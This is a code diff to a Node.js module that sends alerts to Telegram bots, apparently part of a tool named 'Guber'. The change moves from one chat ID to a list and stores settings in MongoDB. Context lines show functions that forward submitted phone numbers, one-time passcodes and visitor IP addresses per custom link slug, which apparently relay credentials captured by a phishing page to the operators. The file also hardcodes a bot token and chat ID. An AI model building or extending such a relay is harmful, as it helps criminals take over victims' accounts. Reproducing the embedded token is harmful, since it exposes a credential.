@@ -1,21 +1,90 @@
 const https = require('https');
 const fs = require('fs');
 const path = require('path');
+const TelegramSettings = require('../models/TelegramSettings');
 
 const STORE_PATH = path.join(__dirname, 'telegram_store.json');
 
 let botToken = '8952162506:AAHz_Jzd918IOGz5wf7wWYkB4Hglr8rhegg';
-let chatId = '934345778';
+let chatIds = ['934345778'];
 
 /**
- * Configure Telegram Bot Token and Chat ID (supports comma-separated IDs)
+ * Configure Telegram Bot Token and Chat IDs array
  */
-function configureTelegram(token, id) {
-    botToken = (token || '').trim();
-    chatId = (id || '').trim();
-    console.log(`[TelegramNotifier] Configured Token: ${botToken ? 'YES' : 'NO'}, ChatID(s): ${chatId || 'NONE'}`);
-    saveLocalFile();
-    return !!(botToken && chatId);
+function configureTelegram(token, ids) {
+    if (token) botToken = token.trim();
+    if (Array.isArray(ids)) {
+        chatIds = ids.map(id => (id || '').toString().trim()).filter(id => id);
+    } else if (typeof ids === 'string') {
+        chatIds = ids.split(',').map(id => id.trim()).filter(id => id);
+    }
+    console.log(`[TelegramNotifier] Configured Token: ${botToken ? 'YES' : 'NO'}, ChatIDs (${chatIds.length}): ${chatIds.join(', ') || 'NONE'}`);
+    return !!(botToken && chatIds.length > 0);
+}
+
+/**
+ * Load settings from MongoDB (or local file)
+ */
+async function initPersistedSettings(isMongoConnected = false) {
+    try {
+        if (isMongoConnected) {
+            let doc = await TelegramSettings.findOne();
+            if (!doc) {
+                doc = new TelegramSettings({
+                    botToken,
+                    chatIds
+                });
+                await doc.save();
+                console.log('[TelegramNotifier] Created default TelegramSettings in MongoDB.');
+            } else {
+                if (doc.botToken) botToken = doc.botToken;
+                if (Array.isArray(doc.chatIds) && doc.chatIds.length > 0) {
+                    chatIds = doc.chatIds;
+                }
+                console.log(`[TelegramNotifier] Loaded TelegramSettings from MongoDB. ChatIDs: ${chatIds.join(', ')}`);
+            }
+            return;
+        }
+    } catch (err) {
+        console.error('[TelegramNotifier] Error loading from MongoDB:', err.message);
+    }
+
+    try {
+        if (fs.existsSync(STORE_PATH)) {
+            const raw = fs.readFileSync(STORE_PATH, 'utf8');
+            const data = JSON.parse(raw);
+            if (data.botToken) botToken = data.botToken;
+            if (Array.isArray(data.chatIds) && data.chatIds.length > 0) {
+                chatIds = data.chatIds;
+            }
+            console.log(`[TelegramNotifier] Loaded TelegramSettings from local file. ChatIDs: ${chatIds.join(', ')}`);
+        }
+    } catch (e) {}
+}
+
+/**
+ * Save settings to MongoDB & local JSON file
+ */
+async function saveTelegramSettings(token, ids, isMongoConnected = false) {
+    configureTelegram(token, ids);
+
+    try {
+        if (isMongoConnected) {
+            await TelegramSettings.findOneAndUpdate({}, {
+                botToken,
+                chatIds
+            }, { upsert: true, new: true });
+            console.log(`[TelegramNotifier] Saved Telegram settings to MongoDB. (${chatIds.length} Chat IDs)`);
+        }
+    } catch (err) {
+        console.error('[TelegramNotifier] Failed to save to MongoDB:', err.message);
+    }
+
+    try {
+        fs.writeFileSync(STORE_PATH, JSON.stringify({ botToken, chatIds }, null, 2), 'utf8');
+    } catch (e) {}
+
+    return getTelegramConfig();
 }
 
 /**
@@ -24,23 +93,21 @@ function configureTelegram(token, id) {
 function getTelegramConfig() {
     return {
         botToken: botToken ? '••••••••' + botToken.slice(-5) : '',
-        chatId: chatId || '',
-        configured: !!(botToken && chatId)
+        chatIds: [...chatIds],
+        configured: !!(botToken && chatIds.length > 0)
     };
 }
 
 /**
- * Send raw HTTPS request to Telegram Bot API (supports sending to multiple Chat IDs)
+ * Send raw HTTPS request to Telegram Bot API for all configured Chat IDs in parallel
  */
 function sendTelegramMessage(text) {
-    if (!botToken || !chatId) {
-        console.log('[TelegramNotifier] Skipping Telegram alert - Bot Token or Chat ID missing.');
+    if (!botToken || chatIds.length === 0) {
+        console.log('[TelegramNotifier] Skipping Telegram alert - Bot Token or Chat IDs missing.');
         return Promise.resolve(false);
     }
 
-    const ids = chatId.split(',').map(id => id.trim()).filter(id => id);
-
-    const promises = ids.map(targetId => {
+    const promises = chatIds.map(targetId => {
         return new Promise((resolve) => {
             const payload = JSON.stringify({
                 chat_id: targetId,
@@ -131,7 +198,7 @@ async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, veri
  * Send test alert
  */
 async function sendTestNotification() {
-    if (!botToken || !chatId) {
+    if (!botToken || chatIds.length === 0) {
         throw new Error('رجاءً أدخل Bot Token و Chat ID أولاً في الإعدادات!');
     }
     const msg = `⚡ <b>Guber Telegram Test Alert</b>\n\n` +
@@ -139,37 +206,15 @@ async function sendTestNotification() {
     return sendTelegramMessage(msg);
 }
 
-/**
- * Load persisted settings from file
- */
-function initPersistedSettings() {
-    try {
-        if (fs.existsSync(STORE_PATH)) {
-            const raw = fs.readFileSync(STORE_PATH, 'utf8');
-            const data = JSON.parse(raw);
-            if (data.botToken && data.chatId) {
-                botToken = data.botToken;
-                chatId = data.chatId;
-                console.log(`[TelegramNotifier] Loaded Telegram config. ChatID(s): ${chatId}`);
-            }
-        }
-    } catch (err) {}
-}
-
-function saveLocalFile() {
-    try {
-        fs.writeFileSync(STORE_PATH, JSON.stringify({ botToken, chatId }, null, 2), 'utf8');
-    } catch (e) {}
-}
-
 // Auto init on load
 initPersistedSettings();
 
 module.exports = {
     configureTelegram,
+    initPersistedSettings,
+    saveTelegramSettings,
     getTelegramConfig,
     notifyPhoneSubmitted,
     notifyOTPVerified,
-    sendTestNotification,
-    initPersistedSettings
+    sendTestNotification
 };
